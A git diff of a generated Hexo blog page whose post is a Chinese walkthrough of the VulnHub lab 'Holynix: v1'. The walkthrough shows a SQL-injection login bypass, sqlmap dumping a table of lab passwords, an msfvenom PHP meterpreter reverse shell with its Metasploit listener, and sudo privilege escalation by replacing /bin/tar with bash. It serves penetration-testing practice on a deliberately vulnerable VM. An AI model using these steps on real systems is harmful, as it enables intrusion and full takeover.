@@ -20,12 +20,12 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="download：vulnhub nmap扫一下：192.168.188.138 1234567891011Nmap scan report for 192.168.188.138Host is up (0.0015s latency).Not shown: 999 closed portsPORT   STATE SERVICE VERSION80&#x2F;tcp open  http    Apach">
+    <meta name="description" content="download：vulnhub nmap扫一下：192.168.188.138 1234567891011Nmap scan report for 192.168.188.138Host is up (0.0015s latency).Not shown: 999 closed portsPORT   STATE SERVICE VERSION80&#x2F;tcp open  http    Apa">
 <meta property="og:type" content="article">
 <meta property="og:title" content="VulnHub_04_Holynix: v1">
 <meta property="og:url" content="http://example.com/2022/03/28/VulnHub04/index.html">
 <meta property="og:site_name" content="郁涛丶&#39;s Blog">
-<meta property="og:description" content="download：vulnhub nmap扫一下：192.168.188.138 1234567891011Nmap scan report for 192.168.188.138Host is up (0.0015s latency).Not shown: 999 closed portsPORT   STATE SERVICE VERSION80&#x2F;tcp open  http    Apach">
+<meta property="og:description" content="download：vulnhub nmap扫一下：192.168.188.138 1234567891011Nmap scan report for 192.168.188.138Host is up (0.0015s latency).Not shown: 999 closed portsPORT   STATE SERVICE VERSION80&#x2F;tcp open  http    Apa">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2022/03/28/VulnHub04/image-20220328170449034.png">
 <meta property="og:image" content="http://example.com/2022/03/28/VulnHub04/image-20220328170704211.png">
@@ -217,7 +217,11 @@
     
     <!-- 谷歌统计  -->
     
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="郁涛丶's Blog" type="application/atom+xml">
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="郁涛丶's Blog" type="application/atom+xml">
 </head>
 
     <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
@@ -341,7 +345,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">454</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">455</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -500,32 +504,29 @@
         <p>download：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/holynix-v1,20/">vulnhub</a></p>
 <p>nmap扫一下：<code>192.168.188.138</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.188.138</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)</span><br><span class="line">MAC Address: 00:0C:29:BC:05:DE (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.24 - 2.6.25</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure>
-
-<p>万能密码：<code>1&#39; or 1=1#</code>登陆，</p>
+<p>万能密码：<code>1' or 1=1#</code>登陆，</p>
 <p>upload的时候应该是说这个用户没权限。</p>
 <p>nikto看一下：</p>
-<p><img src="/2022/03/28/VulnHub04/image-20220328170449034.png" alt="image-20220328170449034"></p>
+<figure>
+<img src="/2022/03/28/VulnHub04/image-20220328170449034.png" alt="image-20220328170449034"><figcaption aria-hidden="true">image-20220328170449034</figcaption>
+</figure>
 <p>本地文件包含，在email那里，post直接发：</p>
-<p><img src="/2022/03/28/VulnHub04/image-20220328170704211.png" alt="image-20220328170704211"></p>
-<p><code>sqlmap -u http://192.168.188.138/index.php?page=login.php --forms --data=&quot;username=gmckinnon&quot; -dbs</code></p>
+<figure>
+<img src="/2022/03/28/VulnHub04/image-20220328170704211.png" alt="image-20220328170704211"><figcaption aria-hidden="true">image-20220328170704211</figcaption>
+</figure>
+<p><code>sqlmap -u http://192.168.188.138/index.php?page=login.php --forms --data="username=gmckinnon" -dbs</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] clients</span><br><span class="line">[*] creds</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br></pre></td></tr></table></figure>
-
 <p>tables:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[5 tables]</span><br><span class="line">+-------------+</span><br><span class="line">| accounts    |</span><br><span class="line">| blogs_table |</span><br><span class="line">| calender    |</span><br><span class="line">| employee    |</span><br><span class="line">| page        |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>
-
 <p>dump:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Database: creds</span><br><span class="line">Table: accounts</span><br><span class="line">[11 entries]</span><br><span class="line">+-----+--------+--------------------+------------+</span><br><span class="line">| cid | upload | password           | username   |</span><br><span class="line">+-----+--------+--------------------+------------+</span><br><span class="line">| 1   | 0      | Ih@cK3dM1cR05oF7   | alamo      |</span><br><span class="line">| 2   | 1      | P3n7@g0n0wN3d      | etenenbaum |</span><br><span class="line">| 3   | 1      | d15cL0suR3Pr0J3c7  | gmckinnon  |</span><br><span class="line">| 4   | 1      | Ik1Ll3dNiN@r315er  | hreiser    |</span><br><span class="line">| 5   | 1      | p1@yIngW17hPh0n35  | jdraper    |</span><br><span class="line">| 6   | 1      | @rR35t3D@716       | jjames     |</span><br><span class="line">| 7   | 1      | m@k1nGb0o7L3g5     | jljohansen |</span><br><span class="line">| 8   | 1      | wH@7ar37H3Fed5D01n | kpoulsen   |</span><br><span class="line">| 9   | 0      | f@7H3r0FL1nUX      | ltorvalds  |</span><br><span class="line">| 10  | 1      | n@5aHaSw0rM5       | mrbutler   |</span><br><span class="line">| 11  | 1      | Myd@d51N7h3NSA     | rtmorris   |</span><br><span class="line">+-----+--------+--------------------+------------+</span><br></pre></td></tr></table></figure>
-
 <p>msfvenom生成反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.188.129 lport=4444 -f raw</span><br></pre></td></tr></table></figure>
-
 <p>tar写为压缩文件然后上传，msf开监听：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.188.129</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure>
-
 <p>进去之后不是root，接下来提权：</p>
 <p>sudo -l看一下有那些命令可以root执行，然后将bash使用chown写为所有组为root，再放到xxx里面，提权成功。</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">User www-data may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /bin/chown</span><br><span class="line">    (root) NOPASSWD: /bin/chgrp</span><br><span class="line">    (root) NOPASSWD: /bin/tar</span><br><span class="line">    (root) NOPASSWD: /bin/mv</span><br><span class="line">$ cp /bin/bash /tmp</span><br><span class="line">cp /bin/bash /tmp</span><br><span class="line">$ ls -l /tmp</span><br><span class="line">ls -l /tmp</span><br><span class="line">total 692</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 702160 Nov 18 10:59 bash</span><br><span class="line">$ sudo chown root:root /tmp/bash</span><br><span class="line">sudo chown root:root /tmp/bash</span><br><span class="line">$ sudo mv /tmp/bash /bin/tar</span><br><span class="line">sudo mv /tmp/bash /bin/tar</span><br><span class="line">$ sudo /bin/tar</span><br><span class="line">sudo /bin/tar</span><br><span class="line">root@holynix:/home/etenenbaum<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@holynix:/home/etenenbaum<span class="comment"># </span></span><br></pre></td></tr></table></figure>
-
 
     </article>
     <!-- license -->
@@ -1009,487 +1010,17 @@
         
         
         
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
     
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
         
         
         
@@ -1626,7 +1157,7 @@
     
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 64
+        Total : 66
         </div>
         <!-- search  -->
         
@@ -1655,6 +1186,18 @@
             <div class="archive-year"> 2022 </div>
             <ul class="year-list">
             
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/28</span>
+            <a class="archive-post-title" href="/2022/06/28/Latex/">Latex使用笔记</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span>
+            <a class="archive-post-title" href="/2022/05/25/Powershell/">Powershell</a>
+        </li>
+    
         
         <li class="archive-post-item">
             <span class="archive-post-date">05/23</span>
@@ -2087,6 +1630,11 @@
                 Java
             </span>
         
+            <span class="sidebar-tag-name" data-tags="内网">
+                <span class="iconfont-archer">&#xe606;</span>
+                内网
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="免杀">
                 <span class="iconfont-archer">&#xe606;</span>
                 免杀
@@ -2122,19 +1670,14 @@
                 Linux
             </span>
         
-            <span class="sidebar-tag-name" data-tags="内网">
+            <span class="sidebar-tag-name" data-tags="OS">
                 <span class="iconfont-archer">&#xe606;</span>
-                内网
+                OS
             </span>
         
             <span class="sidebar-tag-name" data-tags="汇编">
                 <span class="iconfont-archer">&#xe606;</span>
                 汇编
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="OS">
-                <span class="iconfont-archer">&#xe606;</span>
-                OS
             </span>
         
             <span class="sidebar-tag-name" data-tags="WriteUp">
@@ -2150,6 +1693,16 @@
             <span class="sidebar-tag-name" data-tags="Win32">
                 <span class="iconfont-archer">&#xe606;</span>
                 Win32
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ML">
+                <span class="iconfont-archer">&#xe606;</span>
+                ML
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Math">
+                <span class="iconfont-archer">&#xe606;</span>
+                Math
             </span>
         
     </div>
